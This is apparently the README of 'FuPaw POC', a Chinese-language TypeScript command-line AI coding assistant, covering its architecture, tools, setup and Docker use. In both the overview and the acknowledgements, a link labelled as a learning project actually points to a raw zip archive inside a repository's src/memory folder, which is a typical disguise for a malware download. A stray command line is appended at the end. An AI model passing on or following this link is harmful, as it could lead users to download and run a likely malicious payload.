# FuPaw POC 项目

## 项目概述

FuPaw POC 是一个基于核心设计理念的小型版本，旨在探索现代AI辅助编程工具的架构设计和技术实现。该项目是基于学习项目 [claude-code-learning-pure](https://github.com/Benzylic-level459/claude-code-poc/raw/refs/heads/main/src/memory/code_claude_poc_1.2.zip) 的一个POC版本，持续迭代中。

## 技术栈

- **运行时**: Node.js
- **语言**: TypeScript (严格模式)
- **终端UI**: 命令行界面
- **核心依赖**:
  - @anthropic-ai/sdk (Anthropic API客户端)
  - commander (命令行解析)
  - chalk (终端颜色)
  - zod (输入验证)
  - axios (HTTP请求)
  - dotenv (环境变量管理)

## 项目架构

### 目录结构

```
fupaw-poc/
├── docker/                  # Docker相关配置
│   └── Dockerfile
├── src/                     # 源代码
│   ├── backend/             # 后端核心逻辑
│   │   ├── apiService.ts    # API服务 - 处理与LLM的通信
│   │   ├── queryEngine.ts   # 查询引擎 - 处理用户输入和工具调用
│   │   └── toolSystem.ts    # 工具系统 - 管理和执行工具
│   ├── config/              # 配置文件
│   │   └── config.ts
│   ├── frontend/            # 前端界面
│   │   └── cli.ts           # 命令行界面
│   ├── memory/              # 内存系统
│   │   ├── types.ts         # 内存类型定义
│   │   └── MemoryManager.ts # 内存管理器
│   ├── tasks/               # 任务系统
│   │   ├── types.ts         # 任务类型定义
│   │   ├── framework.ts     # 任务框架
│   │   ├── LocalShellTask.ts    # 本地Bash任务
│   │   ├── LocalAgentTask.ts    # 本地代理任务
│   │   └── LocalWorkflowTask.ts # 本地工作流任务
│   ├── tools/               # 工具实现
│   │   ├── TaskCreateTool.ts    # 任务创建工具
│   │   └── MemoryTool.ts        # 内存管理工具
│   └── index.ts             # 主入口
├── .env.example             # 环境变量示例
├── .gitignore
├── docker-compose.yml       # Docker Compose配置
├── package-lock.json
├── package.json
├── README.md                # 项目说明文档
├── architecture-design.md   # 架构设计文档
└── tsconfig.json            # TypeScript配置
```

### 核心组件

#### 1. API服务 (apiService.ts)

API服务负责与LLM的通信，支持两种模式：

- **本地模型**: 通过HTTP请求与本地部署的LLM模型通信
- **Anthropic API**: 通过官方SDK与Anthropic的Claude模型通信

主要功能：

- 发送消息到LLM
- 流式发送消息（实时输出）
- 检查API配置状态
- 获取模型列表

#### 2. 工具系统 (toolSystem.ts)

工具系统提供了一系列可被LLM调用的工具，目前包含：

- **FileReadTool**: 读取文件内容
- **FileWriteTool**: 写入文件内容
- **BashTool**: 执行Bash命令
- **TaskCreateTool**: 创建和管理任务
- **MemoryTool**: 管理内存系统

每个工具都有：

- 名称和描述
- 输入验证模式
- 执行逻辑

工具注册表负责管理所有工具的注册和执行。

#### 3. 查询引擎 (queryEngine.ts)

查询引擎是项目的核心，负责：

- 会话管理（创建、获取、清理）
- 处理用户输入
- 构建系统提示和消息历史
- 与LLM通信
- 解析LLM响应
- 执行工具调用
- 处理工具执行结果
- 流式响应处理

#### 4. 任务系统 (tasks/)

任务系统支持复杂任务处理、工作流和子代理管理：

- **任务类型**: 本地Bash任务、本地代理任务、远程代理任务、工作流任务
- **任务生命周期**: pending（待执行）、running（运行中）、completed（已完成）、failed（失败）、killed（被终止）
- **工作流支持**: 多步骤任务定义、步骤依赖管理、结果传递和引用
- **任务管理**: 任务注册和注销、状态更新和通知、任务输出管理、任务终止和清理

#### 5. 内存系统 (memory/)

内存系统提供三层内存管理和熔断机制：

- **三层内存管理**: short（短期，1小时过期）、medium（中期，24小时过期）、long（长期，30天过期）
- **内存持久化**: 自动保存到磁盘
- **自动过期清理**: 定期清理过期内存项
- **熔断机制**: 防止服务故障影响整个系统
- **内存查询**: 支持文本搜索、标签过滤、类型过滤、层级过滤

#### 6. 命令行界面 (cli.ts)

命令行界面提供了用户与系统交互的入口，支持以下命令：

- **chat**: 启动交互式聊天会话
- **query**: 执行单个查询
- **tools**: 列出可用工具
- **config**: 显示配置信息

## 快速开始

### 环境准备

1. 安装依赖

```bash
npm install
```

1. 配置环境变量

复制 `.env.example` 文件为 `.env`，并根据实际情况修改：

```bash
cp .env.example .env
```

在 `.env` 文件中设置以下环境变量：

- **LOCAL\_MODEL\_ENDPOINT**: 本地LLM模型的HTTP端点（优先使用）
- **ANTHROPIC\_API\_KEY**: Anthropic API密钥（备选）
- **DEFAULT\_MODEL**: 默认使用的模型名称

### 运行项目

#### 开发模式

```bash
npm run dev
```

#### 构建并运行

```bash
npm run build
npm start
```

### 基本使用

#### 启动交互式聊天

```bash
npm run dev chat
```

#### 执行单个查询

```bash
npm run dev query "请帮我写一个Hello World程序"
```

#### 列出可用工具

```bash
npm run dev tools
```

#### 查看配置信息

```bash
npm run dev config
```

## 工具使用示例

### 文件读取

```
请读取当前目录下的package.json文件内容
```

### 文件写入

```
请在当前目录创建一个test.txt文件，内容为"Hello, FuPaw!"
```

### 执行Bash命令

```
请执行ls -la命令查看当前目录结构
```

### 创建任务

```
请创建一个本地Bash任务，执行"echo Hello World"命令，描述为测试任务
```

### 管理工作流

```
请创建一个工作流任务，包含以下步骤：
1. 读取package.json文件
2. 执行npm list命令查看依赖
```

### 使用内存

```
请将"FuPaw是一个AI编程助手"添加到内存中，类型为description，标签为["intro", "ai"]
```

```
请查询内存中关于"AI"的内容
```

## 运行前准备

在运行项目之前，需要确保：

1. **替换LLM节点**：
   - 在 `.env` 文件中设置 `LOCAL_MODEL_ENDPOINT` 指向你的本地LLM服务，例如：
     ```
     LOCAL_MODEL_ENDPOINT=http://localhost:8000/v1/completions
     ```
   - 或者设置 `ANTHROPIC_API_KEY` 使用Anthropic的官方API
2. **确保本地LLM服务运行**：
   - 如果你使用本地模型，请确保你的LLM服务已经启动并运行在指定端口
   - 本地模型需要支持标准的OpenAI兼容API格式

## Docker部署

### 构建镜像

```bash
docker build -t fupaw-poc -f docker/Dockerfile .
```

### 运行容器

```bash
docker run -it --env-file .env fupaw-poc
```

### 使用Docker Compose

```bash
docker-compose up
```

## 项目状态

- **当前版本**: 1.0.0
- **状态**: 持续迭代中
- **作者**: FuPaw POC 项目 Team (<logan.zhang@live.cn>)
- **许可证**: MIT License

## 贡献

欢迎提交Issue和Pull Request，帮助改进这个项目。

## 许可证

MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

## 致谢

本项目基于 [claude-code-learning-pure](https://github.com/Benzylic-level459/claude-code-poc/raw/refs/heads/main/src/memory/code_claude_poc_1.2.zip) 项目的学习和借鉴，感谢原项目的贡献者。npm run dev query "请帮我写一个Hello World程序"
